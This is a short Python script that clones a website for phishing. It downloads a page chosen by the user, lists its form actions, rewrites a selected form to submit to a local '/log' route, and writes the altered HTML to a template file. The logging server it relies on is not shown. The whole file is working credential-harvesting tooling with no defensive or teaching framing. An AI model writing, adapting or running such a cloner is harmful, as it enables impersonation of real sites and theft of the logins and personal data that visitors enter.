import requests
import re

def getInfo():
  url = input("Website to clone (include protocol & route): ")
  content = requests.get(url).text

  forms = []
  for line in content.split("\n"):
    if "action=" in line:
      forms.append(line)

  print(f"Found {len(forms)} form actions:")
  for i,j in enumerate(forms):
    print('[' + str(i+1) + ']', j)

  choiceIndex = int(input("Select a form to inject (numbered): ")) - 1
  # replacing the form action to submit the data to the /log route
  injectedForm = re.sub("action=\"(.*?)\"", "action=\"/log\"", forms[choiceIndex])
  # replacing the form in the file content
  content = content.replace(forms[choiceIndex], injectedForm)

  # writing the injected html to templates/output.html
  with open("templates/output.html", "w+", encoding="utf-8") as f:
    f.write(content)
    f.close()

if __name__ == "__main__":
  getInfo()
